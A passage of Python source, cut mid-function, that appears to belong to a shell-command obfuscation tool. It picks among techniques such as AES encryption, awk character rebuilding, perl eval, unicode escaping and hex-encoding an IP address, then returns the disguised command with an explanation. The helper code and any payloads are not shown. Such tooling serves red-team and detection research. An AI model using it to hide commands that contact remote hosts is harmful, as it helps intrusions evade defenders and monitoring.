            explain = TECHNIQUE_INFO['openssl_aes']['explain']

        elif technique == 'multi_var':
            obf     = _multi_var_full_rebuild(command)
            tech    = TECHNIQUE_INFO['multi_var']['label']
            explain = TECHNIQUE_INFO['multi_var']['explain']

        elif technique == 'awk_chr':
            obf     = _awk_chr_reconstruct(command)
            tech    = TECHNIQUE_INFO['awk_chr']['label']
            explain = TECHNIQUE_INFO['awk_chr']['explain']

        elif technique == 'perl_eval':
            obf     = _perl_eval_exec(command)
            tech    = TECHNIQUE_INFO['perl_eval']['label']
            explain = TECHNIQUE_INFO['perl_eval']['explain']

        elif technique == 'multilayer_lin':
            obf     = _multilayer_linux(command, ip)
            tech    = TECHNIQUE_INFO['multilayer_lin']['label']
            explain = TECHNIQUE_INFO['multilayer_lin']['explain']

        else:
            # ── Deterministic auto mode for Linux ─────────────
            bin_lower = binary.lower()

            candidate = _unicode_escape(command)
            has_url_keywords = (candidate != command)

            if has_url_keywords and ip:
                obf     = _hex_ip(candidate, ip)
                tech    = TECHNIQUE_INFO['unicode']['label'] + ' + hex IP'
                explain = (
                    TECHNIQUE_INFO['unicode']['explain'] + ' '
                    + TECHNIQUE_INFO['hex_ip']['explain']
                )
            elif has_url_keywords:
                obf     = candidate
                tech    = TECHNIQUE_INFO['unicode']['label']
                explain = TECHNIQUE_INFO['unicode']['explain']
            elif ip:
                obf     = _env_concat_plus_hex(command, ip)
                tech    = TECHNIQUE_INFO['env_concat_hex']['label']
                explain = TECHNIQUE_INFO['env_concat_hex']['explain']
            else:
                obf     = _env_concat_linux(command)
                tech    = TECHNIQUE_INFO['env_concat']['label']
                explain = TECHNIQUE_INFO['env_concat']['explain']

    return {
        'obfuscated_command': obf,
        'technique_used':     tech,
        'explanation':        explain,
    }